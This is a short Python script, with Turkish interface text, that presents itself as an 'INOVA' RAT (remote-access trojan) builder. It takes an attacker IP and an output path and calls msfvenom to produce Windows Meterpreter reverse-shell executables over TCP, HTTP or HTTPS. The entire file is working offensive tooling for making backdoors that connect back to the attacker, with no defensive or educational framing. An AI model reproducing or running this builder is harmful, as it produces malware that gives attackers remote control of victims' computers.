#!/usr/bin/env python
import os
from termcolor import colored
print("\n")
print(colored(" INOVA Rat oluşturma aracına hoş geldiniz", 'red', attrs=['bold']))
print("\n")
print("Lütfen aşağıdaki adımları uygulayın")
ip = input("Local veya dış IP giriniz: ")

print("""
Payload seçenekleri:
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")

payload = input("Payload No girin: ")
kayityeri = input("Kayıt yeri girin: ")

if payload == "1":
    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f exe -o {kayityeri}")

if payload == "2":
    os.system(f"msfvenom -p windows/meterpreter/reverse_http LHOST={ip} LPORT=8080 -f exe -o {kayityeri}")

if payload == "3":
    os.system(f"msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT=443 -f exe -o {kayityeri}")
